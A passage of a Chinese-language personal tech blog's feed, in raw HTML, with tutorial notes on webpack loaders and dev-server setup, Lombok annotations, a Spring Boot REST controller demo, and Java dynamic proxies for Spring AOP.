srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211117193537518" style="zoom:50%;"><img src="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117193701304.png" class="lazyload" data-srcset="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117193701304.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211117193701304" style="zoom:50%;"><h3 id="css文件打包"><a href="#css文件打包" class="headerlink" title="css文件打包"></a>css文件打包</h3><p><code>npm i -D css-loader style-loader</code></p><p>配置规则时从右到左（数组的顺序）</p><img src="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117194141948.png" class="lazyload" data-srcset="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117194141948.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211117194141948" style="zoom:50%;"><p>css-loader将多个互相引用的css文件打包成一个文件</p><img src="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117194822506.png" class="lazyload" data-srcset="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117194822506.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211117194822506" style="zoom:50%;"><p>style-loader则是将js文件中引用的css文件打包出来</p><img src="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117194852637.png" class="lazyload" data-srcset="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117194852637.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211117194852637" style="zoom:50%;"><h3 id="使用stylus"><a href="#使用stylus" class="headerlink" title="使用stylus"></a>使用stylus</h3><p><code>npm i -D stylus stylus-loader</code></p><p>stylus-loader将<code>.stylus</code>后缀名的文件生成css文件，再给css-loader合并成一个css文件，最后导入所需要的js中</p><img src="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117195724754.png" class="lazyload" data-srcset="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117195724754.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211117195724754" style="zoom:67%;"><p><strong>一段简单的stylus语法</strong></p><img src="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117200929053.png" class="lazyload" data-srcset="/2021/10/18/%E5%89%8D%E7%AB%AF/webpack%E4%BD%BF%E7%94%A8/image-20211117200929053.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211117200929053" style="zoom:67%;"><h2 id="html-webpack-plugin"><a href="#html-webpack-plugin" class="headerlink" title="html-webpack-plugin"></a>html-webpack-plugin</h2><p><code>npm i -D html-webpack-plugin</code></p><p>在dist文件中生成html</p><p><strong>在webpack.config.js配置</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">&quot;html-webpack-plugin&quot;</span>)</span><br><span class="line"><span class="attr">plugins</span>: [</span><br><span class="line">        <span class="keyword">new</span> VueLoaderPlugin(),</span><br><span class="line">        <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">            <span class="attr">template</span>: <span class="string">&quot;./index.html&quot;</span> <span class="comment">//以xxx为模板</span></span><br><span class="line">        &#125;)</span><br><span class="line">],</span><br></pre></td></tr></table></figure><h2 id="Dev-server"><a href="#Dev-server" class="headerlink" title="Dev-server"></a>Dev-server</h2><p>实时刷新更改后的文件</p><p><code>npm i -D webpack-dev-server</code></p><p><strong>webpack.config.js</strong></p><p>webpack4.5以上的contentBase已经改成了static</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">    <span class="attr">port</span>: <span class="string">&#x27;7070&#x27;</span>,</span><br><span class="line">    <span class="attr">static</span>: <span class="string">&quot;./dist&quot;</span>,</span><br><span class="line">    <span class="attr">open</span>: <span class="literal">true</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="babel"><a href="#babel" class="headerlink" title="babel"></a>babel</h2><p>将es6语法转换兼容es5语法</p><p><code>npm i -D babel-loader @babel/core</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot_Base</title>
      <link href="/2021/10/16/SpringBoot/SpringBoot-Base/"/>
      <url>/2021/10/16/SpringBoot/SpringBoot-Base/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring-Boot异常处理机制</title>
      <link href="/2021/10/16/SpringBoot/Spring-Boot%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/"/>
      <url>/2021/10/16/SpringBoot/Spring-Boot%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java-Lambok</title>
      <link href="/2021/10/15/Java/Java-Lambok/"/>
      <url>/2021/10/15/Java/Java-Lambok/</url>
      
        <content type="html"><![CDATA[<h1 id="依赖包"><a href="#依赖包" class="headerlink" title="依赖包"></a>依赖包</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>jdk10以上需要使用比较新的版本</p><p>注解说明：</p><ul><li><p><code>val</code>：用在局部变量前面，相当于将变量声明为final</p></li><li><p><code>@NonNull</code>：给方法参数增加这个注解会自动在方法内对该参数进行是否为空的校验，如果为空，则抛出NPE（NullPointerException）</p></li><li><p><code>@Cleanup</code>：自动管理资源，用在局部变量之前，在当前变量范围内即将执行完毕退出之前会自动清理资源，自动生成try-finally这样的代码来关闭流。虽然自JDK7以来，原生引入了try–with–resource结构，但还是不如@Cleanup来的简洁。</p></li><li><p><code>@Getter/@Setter</code>：用在属性上，再也不用自己手写setter和getter方法了，还可以指定访问范围</p></li><li><p><code>@ToString</code>：用在类上，可以自动覆写toString方法，当然还可以加其他参数，例如@ToString(exclude=”id”)排除id属性，或者@ToString(callSuper=true, includeFieldNames=true)调用父类的toString方法，包含所有属性</p></li><li><p><code>@EqualsAndHashCode</code>：用在类上，自动生成equals方法和hashCode方法</p></li><li><p><code>@NoArgsConstructor, @RequiredArgsConstructor and @AllArgsConstructor</code>：用在类上，自动生成无参构造和使用所有参数的构造函数以及把所有@NonNull属性作为参数的构造函数，如果指定staticName = “of”参数，同时还会生成一个返回类对象的静态工厂方法，比使用构造函数方便很多</p></li><li><p><code>@Data</code>：注解在类上，相当于同时使用了<code>@ToString</code>、<code>@EqualsAndHashCode</code>、<code>@Getter</code>、<code>@Setter</code>和<code>@RequiredArgsConstrutor</code>这些注解，对于<code>POJO类</code>十分有用</p></li><li><p><code>@Value</code>：用在类上，是@Data的不可变形式，相当于为属性添加final声明，只提供getter方法，而不提供setter方法</p></li><li><p><code>@Builder</code>：用在类、构造器、方法上，为你提供复杂的builder APIs，让你可以像如下方式一样调用<code>Person.builder().name(&quot;Adam Savage&quot;).city(&quot;San Francisco&quot;).job(&quot;Mythbusters&quot;).job(&quot;Unchained Reaction&quot;).build();</code>更多说明参考Builder</p></li><li><p><code>@SneakyThrows</code>：自动抛受检异常，而无需显式在方法上使用throws语句</p></li><li><p><code>@Synchronized</code>：用在方法上，将方法声明为同步的，并自动加锁，而锁对象是一个私有的属性<code>$lock</code>或<code>$LOCK</code>，而java中的synchronized关键字锁对象是this，锁在this或者自己的类对象上存在副作用，就是你不能阻止非受控代码去锁this或者类对象，这可能会导致竞争条件或者其它线程错误</p></li><li><p><code>@Getter(lazy=true)</code>：可以替代经典的Double Check Lock样板代码</p></li><li><p><code>@Log</code>：根据不同的注解生成不同类型的log对象，但是实例名称都是log，有六种可选实现类</p></li><li><ul><li><code>@CommonsLog</code> Creates log = org.apache.commons.logging.LogFactory.getLog(LogExample.class);</li><li><code>@Log</code> Creates log = java.util.logging.Logger.getLogger(LogExample.class.getName());</li><li><code>@Log4j</code> Creates log = org.apache.log4j.Logger.getLogger(LogExample.class);</li><li><code>@Log4j2</code> Creates log = org.apache.logging.log4j.LogManager.getLogger(LogExample.class);</li><li><code>@Slf4j</code> Creates log = org.slf4j.LoggerFactory.getLogger(LogExample.class);</li><li><code>@XSlf4j</code> Creates log = org.slf4j.ext.XLoggerFactory.getXLogger(LogExample.class);</li></ul></li></ul><h2 id="ToString注解"><a href="#ToString注解" class="headerlink" title="@ToString注解"></a>@ToString注解</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Son.java</span></span><br><span class="line"><span class="meta">@ToString(callSuper = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> money=<span class="number">2333</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> score=<span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Father.java</span></span><br><span class="line"><span class="meta">@ToString</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Father</span> </span>&#123;</span><br><span class="line">    String name=<span class="string">&quot;mike&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> age=<span class="number">123</span>;</span><br><span class="line">    String sex=<span class="string">&quot;f&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行<code>System.out.println(son.toString());</code></p><p><img src="/2021/10/15/Java/Java-Lambok/image-20211015181240978.png" class="lazyload" data-srcset="/2021/10/15/Java/Java-Lambok/image-20211015181240978.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211015181240978"></p><p><code>@ToString(exclude = &quot;id&quot;, callSuper = true, includeFieldNames = true)</code></p><p>exclude排除掉某个属性，callSuper则是调用父函数的toString，而includeFieldNames则是是否打印属性的值，默认是true</p><h2 id="Val示例"><a href="#Val示例" class="headerlink" title="@Val示例"></a>@Val示例</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    val sets = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">    val lists = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    val maps = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">    <span class="comment">//=&gt;相当于如下</span></span><br><span class="line">    <span class="keyword">final</span> Set&lt;String&gt; sets2 = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">final</span> List&lt;String&gt; lists2 = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">final</span> Map&lt;String, String&gt; maps2 = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring-Boot-demo01</title>
      <link href="/2021/10/15/SpringBoot/Spring-Boot-demo01/"/>
      <url>/2021/10/15/SpringBoot/Spring-Boot-demo01/</url>
      
        <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//controller类</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BookController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Book&gt; books = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/book&quot;)</span></span><br><span class="line">        <span class="keyword">public</span> ResponseEntity&lt;List&lt;Book&gt;&gt; addBook(<span class="meta">@RequestBody</span> Book book) &#123;</span><br><span class="line">        books.add(book);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(books);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@DeleteMapping(&quot;/book/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseEntity <span class="title">deleteBookById</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> <span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        books.remove(id);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(books);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/book&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseEntity <span class="title">getBookByName</span><span class="params">(<span class="meta">@RequestParam(&quot;name&quot;)</span> String name)</span> </span>&#123;</span><br><span class="line">        List&lt;Book&gt; results = books.stream().filter(book -&gt; book.getName().equals(name)).collect(Collectors.toList());</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(results);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>@RestController</code>注释是以将返回对象进行处理以json方式返回，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Controller` +`@ResponseBody`= `@RestController</span><br></pre></td></tr></table></figure><p><code>@RequestMapping</code> :上面的示例中没有指定 GET 与 PUT、POST 等，因为**<code>@RequestMapping</code>默认映射所有HTTP Action**，你可以使用<code>@RequestMapping(method=ActionType)</code>来缩小这个映射。</p><p><code>@PostMapping</code>实际上就等价于 <code>@RequestMapping(method = RequestMethod.POST)</code>，同样的 <code> @DeleteMapping</code> ,<code>@GetMapping</code>也都一样，常用的 HTTP Action 都有一个这种形式的注解所对应。</p><p><code>@PathVariable</code> :取url地址中的参数。<code>@RequestParam </code> url的查询参数值。</p><p><code>@RequestBody</code>:可以<strong>将 *HttpRequest* body 中的 JSON 类型数据反序列化为合适的 Java 类型。</strong></p><p><code>ResponseEntity</code>: <strong>表示整个HTTP Response：状态码，标头和正文内容</strong>。我们可以使用它来自定义HTTP Response 的内容。</p><p>运行结果：</p><p><img src="/2021/10/15/SpringBoot/Spring-Boot-demo01/image-20211016142834381.png" class="lazyload" data-srcset="/2021/10/15/SpringBoot/Spring-Boot-demo01/image-20211016142834381.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211016142834381"></p><p>以上以Json格式进行请求</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring-AOP</title>
      <link href="/2021/10/14/Spring/Spring-AOP/"/>
      <url>/2021/10/14/Spring/Spring-AOP/</url>
      
        <content type="html"><![CDATA[<h1 id="实现一个动态代理"><a href="#实现一个动态代理" class="headerlink" title="实现一个动态代理"></a>实现一个动态代理</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Database</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//DataBase 接口</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mong</span> <span class="keyword">implements</span> <span class="title">Database</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Mong语言的增加&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Mong语言的删除&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Mong语言的更新&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Mong语言的查询&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实现类</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Myinvocationhander</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    Object object;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setObject</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.object = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//返回一个代理对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">ret_myproxy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(object.getClass().getClassLoader(),object.getClass().getInterfaces(),<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实现该接口唯一的方法，通过反射去调用方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Object result=method.invoke(object,args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//代理实例处理类</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">主要重点在于Proxy中的发挥代理对象方法newProxyInstance以及 Invocationhander接口，以及获得代理对象转型必须是接口，才能向上转型成功，例如该案例中必须将newProxyInstance获取到的代理类转为DataBase</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>测试类</p><img src="/2021/10/14/Spring/Spring-AOP/image-20211014150854641.png" class="lazyload" data-srcset="/2021/10/14/Spring/Spring-AOP/image-20211014150854641.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211014150854641" style="zoom:50%;"><img src="/2021/10/14/Spring/Spring-AOP/image-20211014150904461.png" class="lazyload" data-srcset="/2021/10/14/Spring/Spring-AOP/image-20211014150904461.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211014150904461" style="zoom:80%;"><h1 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h1><img src="/2021/10/14/Spring/Spring-AOP/image-20211014151815401.png" class="lazyload" data-srcset="/2021/10/14/Spring/Spring-AOP/image-20211014151815401.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211014151815401" style="zoom:50%;"><img src="/2021/10/14/Spring/Spring-AOP/image-20211014160359416.png" class="lazyload" data-srcset="/2021/10/14/Spring/Spring-AOP/image-20211014160359416.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211014160359416" style="zoom:50%;"><h2 id="Spring-API接口实现一个切面编程"><a href="#Spring-API接口实现一个切面编程" class="headerlink" title="Spring API接口实现一个切面编程"></a>Spring API接口实现一个切面编程</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span 